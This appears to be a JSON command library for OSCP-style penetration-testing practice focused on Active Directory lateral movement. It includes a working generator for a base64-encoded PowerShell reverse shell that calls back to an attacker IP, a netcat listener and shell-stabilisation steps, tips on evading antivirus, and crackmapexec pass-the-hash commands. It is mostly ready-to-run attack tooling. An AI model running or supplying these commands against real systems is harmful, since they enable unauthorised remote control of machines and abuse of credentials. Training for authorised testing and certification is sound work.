{
  "commands": [
    {
      "id": "wmi-creds-pscredential",
      "name": "Helper - Create PSCredential Object for WMI/WinRM",
      "description": "Create PowerShell credential object for use in WMI, WinRM, and other remoting commands",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password)",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Domain\\username or username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "helper",
        "pscredential",
        "powershell",
        "active-directory",
        "windows",
        "utility",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "Use $credential variable in -Credential parameter",
        "Examples: New-PSSession, Invoke-Command, Invoke-WmiMethod, New-CimSession"
      ],
      "flag_explanations": {
        "ConvertTo-SecureString": "Convert plaintext password to SecureString object (encrypted in memory)",
        "-AsPlainText": "Allow plaintext input (normally requires interactive prompt)",
        "-Force": "Bypass security warning for plaintext password",
        "New-Object System.Management.Automation.PSCredential": "Create credential object with username and SecureString password",
        "Get-Credential": "Interactive alternative - prompts user for username/password (better OPSEC)"
      },
      "success_indicators": [
        "$credential variable contains PSCredential object",
        "$credential | Get-Member shows PSCredential type",
        "UserName and Password properties present",
        "$credential.UserName shows username"
      ],
      "failure_indicators": [
        "ConvertTo-SecureString error",
        "Cannot convert argument",
        "New-Object failed"
      ],
      "troubleshooting": {
        "Special characters in password": "Use single quotes around password to prevent PowerShell interpretation: '<PASS>'",
        "Password visible in history": "Use $password = Read-Host -AsSecureString for sensitive scenarios (no plaintext)",
        "Domain format error": "Use 'corp\\jen' not 'jen@corp.com' for username format",
        "Cannot convert to SecureString": "Verify password string is valid. Test with: '<PASS>'.GetType()"
      },
      "notes": "EDUCATIONAL CONTEXT:\nPSCredential is PowerShell object encapsulating username and encrypted password for remote authentication.\n\nWHY NEEDED:\nMany PowerShell remoting cmdlets require PSCredential object, not plain strings.\n\nSECURITY:\nSecureString encrypts password in memory using DPAPI (Data Protection API) - not plaintext.\n\nREUSABILITY:\nCreate $credential once at session start, reuse in multiple commands (Invoke-Command, New-PSSession, Invoke-WmiMethod, etc.).\n\nALTERNATIVE:\nGet-Credential provides interactive prompt (better OPSEC - no password in command history or logs).\n\nVERIFICATION:\nTest credential with $credential.GetNetworkCredential().Password to view plaintext (debugging only).\n\nBEHIND THE SCENES:\nPSCredential stores username as string, password as SecureString (encrypted).\n\nTIME ESTIMATE:\n<30 seconds to create.\n\nEXAM TIP:\nCreate credential object at start of session, reuse throughout lateral movement commands.\n\nSaves typing and reduces errors.",
      "oscp_relevance": "high"
    },
    {
      "id": "revshell-ps-generator",
      "name": "Helper - Generate Base64 PowerShell Reverse Shell",
      "description": "Python one-liner to generate base64-encoded PowerShell reverse shell with custom LHOST/LPORT for lateral movement",
      "command": "python3 -c \"import base64; LHOST='<LHOST>'; LPORT='<LPORT>'; payload = f'\\$client = New-Object System.Net.Sockets.TCPClient(\\'{LHOST}\\',{LPORT});\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{{0}};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){{;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()}};\\$client.Close()'; encoded = base64.b64encode(payload.encode('utf16')[2:]).decode(); print(encoded)\"",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP for reverse connection",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port for listener",
          "example": "443",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "helper",
        "reverse-shell",
        "powershell",
        "generator",
        "kali",
        "utility",
        "base64",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "Copy base64 output to <BASE64_PAYLOAD> variable",
        "Use in wmi-powershell-revshell, dcom-mmc20-revshell, or winrm-revshell-invoke",
        "Start listener before execution: nc -lvnp <LPORT>"
      ],
      "flag_explanations": {
        "TCPClient('<LHOST>',<LPORT>)": "Creates TCP connection to attacker IP and port",
        "GetStream()": "Get network stream for bidirectional read/write",
        "while loop": "Continuously read commands from attacker, execute, send output back",
        "iex $data": "Execute received commands (Invoke-Expression alias)",
        "Out-String": "Convert command output objects to string for transmission",
        "pwd": "Current directory path for PowerShell prompt simulation",
        "encode('utf16')[2:]": "PowerShell expects UTF-16LE encoding, [2:] removes BOM (Byte Order Mark)",
        "base64.b64encode()": "Encode payload to base64 for -EncodedCommand parameter"
      },
      "success_indicators": [
        "Output: long base64 string (no 'powershell -nop -w hidden -e' prefix)",
        "Listener catches connection when executed with: powershell -nop -w hidden -e <OUTPUT>",
        "Interactive PowerShell prompt on Kali",
        "whoami and hostname work in caught shell"
      ],
      "failure_indicators": [
        "Python syntax error",
        "Empty output",
        "Encoding error",
        "UnicodeDecodeError"
      ],
      "troubleshooting": {
        "Python syntax error": "Ensure LHOST/LPORT properly substituted in command",
        "No callback when executed": "Verify LHOST reachable from target. Test with: Test-NetConnection <LHOST> -Port <LPORT>",
        "Connection drops immediately": "Firewall blocking outbound. Check target egress filtering",
        "Antivirus blocks payload": "Obfuscate payload with Invoke-Obfuscation or use alternative technique",
        "Base64 decode error": "Verify UTF-16LE encoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))"
      },
      "notes": "EDUCATIONAL CONTEXT:\nOne-liner Python script to generate ready-to-use base64-encoded PowerShell reverse shell.\n\nWHY USE THIS:\nFast payload generation during exploitation, customizable LHOST/LPORT for different scenarios.\n\nHOW IT WORKS:\n1) TCPClient connects to LHOST:LPORT, 2) Loop reads commands from attacker, 3) Execute with iex (Invoke-Expression), 4) Send output back over TCP, 5) Repeat until connection closed.\n\nPAYLOAD STRUCTURE:\nTCP connection → GetStream → Read commands → Execute → Send output → Loop.\n\nBASE64 ENCODING:\nAvoids command-line escaping issues, bypasses basic signature detection (not AV-proof).\n\nUTF-16LE REQUIREMENT:\nPowerShell -EncodedCommand expects UTF-16 Little Endian encoding with BOM removed.\n\nOBFUSCATION:\nBase64 provides basic evasion but not sophisticated AV bypass.\n\nUSAGE:\nCopy output, use in lateral movement command like:\npowershell -nop -w hidden -e <BASE64>.\n\nTIME ESTIMATE:\n<1 minute for generation + execution.\n\nEXAM TIP:\nSave as script file (generate_revshell.py) for quick access.\n\nPre-generate payloads for common LHOST values (tun0 IP) before exam start.",
      "oscp_relevance": "high"
    },
    {
      "id": "nc-listener-tcp",
      "name": "Helper - Netcat TCP Listener for Reverse Shells",
      "description": "Start Netcat listener on Kali to catch incoming reverse shell connections from lateral movement payloads",
      "command": "nc -lvnp <LPORT>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<LPORT>",
          "description": "Local port to listen on",
          "example": "443",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "helper",
        "netcat",
        "listener",
        "reverse-shell",
        "kali",
        "utility",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "Wait for connection from lateral movement payload",
        "When connected, execute: whoami; hostname to verify target",
        "Stabilize shell if needed: python -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "Upgrade to interactive: Ctrl+Z, stty raw -echo; fg, export TERM=xterm"
      ],
      "flag_explanations": {
        "-l": "Listen mode - wait for incoming connections",
        "-v": "Verbose - show connection details (IP, port)",
        "-n": "Numeric only - don't resolve DNS names (faster)",
        "-p <LPORT>": "Port to listen on",
        "rlwrap": "Readline wrapper - provides arrow keys, command history in shell",
        "-e /bin/bash": "Execute /bin/bash on connect (dangerous - don't use in listener mode)"
      },
      "success_indicators": [
        "Listening on 0.0.0.0 <LPORT>",
        "Connection received from <TARGET_IP>",
        "Interactive shell prompt appears",
        "Commands execute successfully"
      ],
      "failure_indicators": [
        "Address already in use",
        "Permission denied",
        "Connection timeout (no callback)",
        "Connection received then immediate disconnect"
      ],
      "troubleshooting": {
        "Address already in use": "Port conflict. Check what's using port: sudo lsof -i:<LPORT>. Kill process or use different port",
        "Permission denied": "Ports <1024 require root. Use sudo or choose port >1024 (e.g., 4444, 443 without sudo won't work)",
        "No connection received": "Verify payload has correct LHOST/LPORT. Check target firewall allows outbound to <LPORT>",
        "Connection drops immediately": "Payload error or AV killed process. Check payload syntax. Test locally first",
        "No arrow keys work": "Use rlwrap: rlwrap nc -lvnp <LPORT> for readline support"
      },
      "notes": "EDUCATIONAL CONTEXT:\nNetcat listener is essential component of reverse shell workflow - attacker-side receiver for callbacks.\n\nWHY REVERSE SHELL:\nTarget connects back to attacker (bypasses inbound firewall rules).\n\nCOMMON PORTS:\n443 (HTTPS - often allowed outbound), 4444 (default Metasploit), 80 (HTTP), 53 (DNS).\n\nLISTENER TIMING:\nStart listener BEFORE executing reverse shell payload on target.\n\nRLWRAP RECOMMENDATION:\nUse 'rlwrap nc -lvnp <LPORT>' for better interactivity (arrow keys, command history).\n\nSTABILIZATION:\nRaw Netcat shells are unstable - stabilize with:\npython -c 'import pty;pty.spawn(\"/bin/bash\")' then Ctrl+Z, stty raw -echo; fg.\n\nALTERNATIVE:\npwncat-cs provides built-in stabilization, file upload/download, persistence modules.\n\nBEHIND THE SCENES:\nNetcat binds to port, accepts TCP connection, bidirectional data transfer (stdin/stdout).\n\nTIME ESTIMATE:\n<10 seconds to start listener.\n\nEXAM TIP:\nAlways start listener before executing payload.\n\nUse rlwrap for better UX.\n\nKeep listener in tmux/screen pane for persistence.",
      "oscp_relevance": "high"
    },
    {
      "id": "verify-root-access-ad",
      "name": "Helper - Verify Remote Access and Privileges",
      "description": "Quick verification commands to confirm remote shell access, identify target system, and check privilege level",
      "command": "whoami; hostname; whoami /priv",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "oscp",
        "helper",
        "verification",
        "enumeration",
        "windows",
        "privilege-check",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "If SYSTEM: Full control - dump credentials, access all files",
        "If admin user: Check UAC status: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        "If standard user: Enumerate for privilege escalation: whoami /all, systeminfo"
      ],
      "flag_explanations": {
        "whoami": "Display current user context (domain\\username or NT AUTHORITY\\SYSTEM)",
        "hostname": "Display computer name (confirms correct target)",
        "whoami /priv": "Display current privileges (SeImpersonatePrivilege, SeDebugPrivilege, etc.)",
        "whoami /all": "Display user, groups, SID, and all privileges (comprehensive)",
        "whoami /groups": "Display group memberships (Administrators, Remote Management Users, etc.)"
      },
      "success_indicators": [
        "whoami: NT AUTHORITY\\SYSTEM (highest privilege)",
        "whoami: DOMAIN\\username (expected user context)",
        "hostname: correct target name",
        "Privileges include SeImpersonatePrivilege, SeDebugPrivilege (potential PrivEsc paths)"
      ],
      "failure_indicators": [
        "Access denied",
        "Command not found",
        "Shell hangs or crashes"
      ],
      "troubleshooting": {
        "whoami not found": "Unlikely on Windows. Verify shell is Windows not Linux",
        "Access denied on whoami /priv": "Very unlikely. Verify shell is responsive: echo test",
        "Wrong user context": "Payload executed as different user. Check credential used in lateral movement",
        "Wrong hostname": "Connected to wrong target. Verify IP in payload matches intended target"
      },
      "notes": "EDUCATIONAL CONTEXT:\nFirst commands to run after obtaining remote shell - verify access and assess privilege level.\n\nWHY THESE COMMANDS:\nwhoami confirms user context, hostname confirms target, whoami /priv shows available privileges for escalation.\n\nSYSTEM vs ADMIN:\nNT AUTHORITY\\SYSTEM is highest privilege (kernel-level), local admin is high but not SYSTEM.\n\nPRIVILEGE ESCALATION:\nIf SeImpersonatePrivilege present, can use Juicy Potato/PrintSpoofer/RoguePotato for SYSTEM.\n\nCOMMON CONTEXTS:\nPSExec→SYSTEM, WMI→user, WinRM→user, DCOM→user.\n\nGROUP MEMBERSHIP:\nwhoami /groups shows if user in Administrators local group.\n\nSID IDENTIFICATION:\nwhoami /all shows SID - useful for token manipulation.\n\nTIME ESTIMATE:\n<10 seconds to run all three commands.\n\nEXAM TIP:\nAlways verify access immediately after shell obtained - confirms success and informs next steps (credential dump if SYSTEM, PrivEsc if user).",
      "oscp_relevance": "high"
    },
    {
      "id": "lateral-movement-port-check",
      "name": "Helper - Quick Port Check for Lateral Movement Options",
      "description": "Rapidly scan common lateral movement ports on target to determine available attack vectors",
      "command": "sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v <TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "helper",
        "enumeration",
        "port-scan",
        "nmap",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "135 open → WMI (wmi-new-cimsession) or DCOM (dcom-mmc20-revshell) possible",
        "445 open → PSExec (psexec-impacket-shell) or SMBExec (smbexec-impacket-fileless) possible",
        "5985 open → WinRM HTTP (evil-winrm-creds, winrm-enter-pssession) possible",
        "5986 open → WinRM HTTPS (evil-winrm-creds -S) possible",
        "3389 open → RDP (rdesktop, xfreerdp) for manual GUI access"
      ],
      "flag_explanations": {
        "-p 135,445,5985,5986,3389": "Scan specific lateral movement ports (RPC, SMB, WinRM HTTP/HTTPS, RDP)",
        "-Pn": "Skip ping check - treat host as up (bypass ICMP filtering)",
        "-sV": "Service version detection - identify exact service/version",
        "-v": "Verbose output - show progress during scan",
        "sudo": "Required for SYN scan and accurate OS/service detection"
      },
      "success_indicators": [
        "135/tcp open  msrpc (Microsoft RPC)",
        "445/tcp open  microsoft-ds (SMB)",
        "5985/tcp open  http (Microsoft HTTPAPI httpd 2.0 - WinRM)",
        "5986/tcp open  ssl/http (WinRM over HTTPS)",
        "3389/tcp open  ms-wbt-server (RDP)"
      ],
      "failure_indicators": [
        "All ports filtered/closed",
        "Host seems down",
        "No response on any port"
      ],
      "troubleshooting": {
        "All ports filtered": "Firewall blocking - may need pivoting or alternative access path",
        "Host seems down": "Verify IP correct: ping <TARGET>. If pingable but ports filtered, use -Pn (already included)",
        "Slow scan": "Add -T4 for faster timing (aggressive): sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v -T4 <TARGET>",
        "Connection timeout": "Network unreachable. Check routing: ip route get <TARGET>"
      },
      "notes": "EDUCATIONAL CONTEXT:\nQuick reconnaissance to determine viable lateral movement vectors before attempting exploitation.\n\nPORT MEANINGS:\n135=RPC (WMI/DCOM), 445=SMB (PSExec/SMBExec), 5985=WinRM HTTP, 5986=WinRM HTTPS, 3389=RDP.\n\nTECHNIQUE MAPPING:\nUse port availability to select lateral movement technique (see decision tree).\n\nFAST SCAN:\nOnly 5 ports - completes in <1 minute vs full 65535 port scan.\n\nTECHNIQUE PRIORITY:\nIf multiple ports open, try WinRM first (cleanest), then PSExec (most reliable), then WMI/DCOM (stealthier).\n\nCOMPARISON:\nMore targeted than full nmap scan, faster than testing each technique individually.\n\nSERVICE DETECTION:\n-sV identifies exact service version (e.g., WinRM vs generic HTTP on 5985).\n\nBEHIND THE SCENES:\nNmap sends SYN packets to ports, analyzes responses, fingerprints services with version probes.\n\nTIME ESTIMATE:\n30 seconds to 1 minute for port scan.\n\nEXAM TIP:\nRun this immediately after identifying target to plan lateral movement approach.\n\nSaves time by focusing on available techniques only.",
      "oscp_relevance": "high"
    },
    {
      "id": "lateral-movement-troubleshooting",
      "name": "Helper - Troubleshoot Common Lateral Movement Failures",
      "description": "Systematic troubleshooting guide for diagnosing authentication failures, connection timeouts, and access denied errors",
      "command": "# Test credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>\n# Test admin access: crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares\n# Test hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM>\n# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH\n# Verify ports: sudo nmap -p 135,445,5985 -Pn -v <TARGET>\n# Check firewall: Test-NetConnection <TARGET> -Port <PORT> from Windows\n# Time sync: net time \\\\<DC> (Kerberos requires <5 min time skew)\n# Service status: Get-Service WinRM,RpcSs -ComputerName <TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DC>",
          "description": "Domain Controller IP or hostname",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<NTLM>",
          "description": "NTLM hash",
          "example": "abc123...",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "password",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Target port number",
          "example": "80",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "admin",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "helper",
        "troubleshooting",
        "authentication",
        "active-directory",
        "reference",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "Follow troubleshooting steps in order until root cause identified",
        "Apply appropriate fix based on failure type",
        "Retry lateral movement with corrected parameters"
      ],
      "flag_explanations": {
        "crackmapexec smb": "Test SMB authentication and admin access",
        "--shares": "Verify ADMIN$ share accessible (confirms admin rights)",
        "-H <NTLM>": "Test pass-the-hash with NTLM hash",
        "sudo nmap -p 135,445,5985": "Verify required ports open for lateral movement",
        "Test-NetConnection -Port": "PowerShell connectivity test to specific port",
        "net time \\\\<DC>": "Check time difference with Domain Controller (Kerberos requirement)",
        "Get-Service WinRM,RpcSs": "Verify required services running on target"
      },
      "success_indicators": [
        "[+] Pwn3d! from CrackMapExec (admin access confirmed)",
        "ADMIN$ share visible with READ,WRITE permissions",
        "Ports 135, 445, or 5985 open on target",
        "Time skew <5 minutes from DC",
        "Required services running"
      ],
      "failure_indicators": [
        "STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED",
        "Connection timeout",
        "RPC server unavailable",
        "The user name or password is incorrect"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Verify username/password correct. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "STATUS_ACCESS_DENIED": "User authenticated but not local admin. Verify admin group membership: net user <USER> /domain",
        "No Pwn3d! but authentication succeeds": "User not in Administrators local group. PSExec/WMI will fail. Try different user or PrivEsc",
        "UAC restriction (local admin hash fails)": "2014 Microsoft patch blocks non-RID-500 local admin PTH. Use domain user or find RID 500 Administrator hash",
        "Connection timeout": "Firewall blocking ports. Verify with: sudo nmap -p 135,445,5985 -Pn -v <TARGET>",
        "RPC server unavailable": "Port 135 filtered or RPC service disabled. Use alternative: WinRM (5985) or SMB (445) only techniques",
        "Kerberos time skew": "Clock difference >5 minutes. Sync time: sudo ntpdate <DC_IP> or net time \\\\<DC> /set /yes",
        "Service not running": "WinRM or RPC service disabled. Enable remotely if admin: Set-Service WinRM -StartupType Automatic -Status Running"
      },
      "notes": "EDUCATIONAL CONTEXT:\nSystematic troubleshooting framework for lateral movement failures - saves exam time.\n\nCOMMON CAUSES:\n1) Invalid credentials (most common), 2) User not admin (second most common), 3) UAC remote restrictions (hash-based auth), 4) Firewall blocking ports, 5) Time skew (Kerberos), 6) Service disabled.\n\nTROUBLESHOOTING ORDER:\nTest credentials → Verify admin access → Check ports → Verify services → Check time sync.\n\nUAC LIMITATION:\n2014 KB2871997 patch blocks local admin pass-the-hash for non-RID-500 accounts (domain users unaffected).\n\nCRACKMAPEXEC VERIFICATION:\nAlways test with CME before full exploitation - fastest way to verify credentials and admin access.\n\nPWNED MEANING:\n[+] Pwn3d! indicator confirms user has local administrator rights (can PSExec/WMI).\n\nTIME SKEW:\nKerberos authentication fails if clock difference >5 minutes from DC - sync with ntpdate or net time.\n\nFIREWALL:\nIf ports show 'filtered' in nmap, lateral movement impossible without pivoting.\n\nSERVICE DEPENDENCIES:\nWinRM requires WinRM service, WMI requires RpcSs (RPC), PSExec requires Server service.\n\nTIME ESTIMATE:\n5-10 minutes for full troubleshooting workflow.\n\nEXAM TIP:\nDon't waste time on blocked techniques - verify prerequisites first, pivot to alternatives if blocked.",
      "oscp_relevance": "high"
    }
  ]
}